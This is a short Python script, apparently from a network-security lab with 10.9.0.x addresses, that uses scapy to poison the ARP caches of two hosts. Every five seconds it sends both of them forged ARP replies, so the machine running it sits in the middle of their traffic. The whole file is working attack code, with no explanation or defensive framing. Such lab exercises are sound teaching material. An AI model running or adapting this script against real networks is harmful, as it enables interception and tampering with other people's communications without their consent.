# flake8: noqa
#!/usr/bin/env python3
from scapy.all import ARP, Ether, sendp
from time import sleep

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"

def arp_reply():
    pkt_A = Ether(dst=MAC_A) / ARP(op=2, pdst=IP_A, psrc=IP_B, hwdst=MAC_A)
    pkt_B = Ether(dst=MAC_B) / ARP(op=2, pdst=IP_B, psrc=IP_A, hwdst=MAC_B)
    sendp(pkt_A)
    sendp(pkt_B)

def main():
    while True:
        arp_reply()
        sleep(5)

if __name__=='__main__':
    main()